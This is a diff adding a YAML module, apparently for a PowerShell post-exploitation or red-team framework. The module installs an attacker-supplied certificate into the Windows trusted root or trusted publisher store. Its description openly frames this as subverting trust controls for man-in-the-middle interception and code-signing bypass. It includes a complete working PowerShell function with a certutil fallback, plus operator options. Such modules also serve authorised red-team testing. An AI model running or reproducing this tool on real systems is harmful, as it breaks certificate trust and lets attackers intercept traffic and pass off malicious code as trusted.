@@ -1,0 +1,77 @@
+name: Install-Root-Certificate
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Import a certificate into the Windows trusted root or trusted
+  publisher certificate store to subvert trust controls. Adversaries
+  install root certificates to enable man-in-the-middle attacks,
+  bypass code signing requirements, or establish trust for malicious
+  tools. This module supports importing via Import-Certificate
+  PowerShell cmdlet or certutil.exe. Administrative privileges are
+  required to modify the machine certificate store.
+software: ''
+tactics: [TA0005]
+techniques: [T1553.004]
+background: false
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: CertPath
+    description: Path to the certificate file to import (.cer, .crt, .pem).
+    required: true
+    value: ''
+  - name: CertStore
+    description: Target certificate store to install the certificate into.
+    required: true
+    value: 'Root'
+    strict: true
+    suggested_values:
+      - Root
+      - TrustedPublisher
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Install-RootCertificate {
+      param(
+          [string]$CertPath,
+          [string]$CertStore
+      )
+
+      if (-not (Test-Path $CertPath)) {
+          Write-Output "[-] Certificate file not found: $CertPath"
+          return
+      }
+
+      Write-Output "[*] Importing certificate from: $CertPath"
+      Write-Output "[*] Target store: Cert:\LocalMachine\$CertStore"
+
+      try {
+          $cert = Import-Certificate -FilePath $CertPath `
+              -CertStoreLocation "Cert:\LocalMachine\My"
+          Move-Item -Path $cert.PSPath `
+              -Destination "Cert:\LocalMachine\$CertStore"
+          Write-Output "[+] Certificate installed successfully."
+          Write-Output "[+] Thumbprint: $($cert.Thumbprint)"
+          Write-Output "[+] Subject: $($cert.Subject)"
+      }
+      catch {
+          Write-Output "[-] Import-Certificate failed: $($_.Exception.Message)"
+          Write-Output "[*] Falling back to certutil..."
+          $storeArg = if ($CertStore -eq "Root") { "root" } else { "TrustedPublisher" }
+          $result = certutil -addstore $storeArg $CertPath 2>&1
+          Write-Output $result
+      }
+  }
+script_end: Install-RootCertificate {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
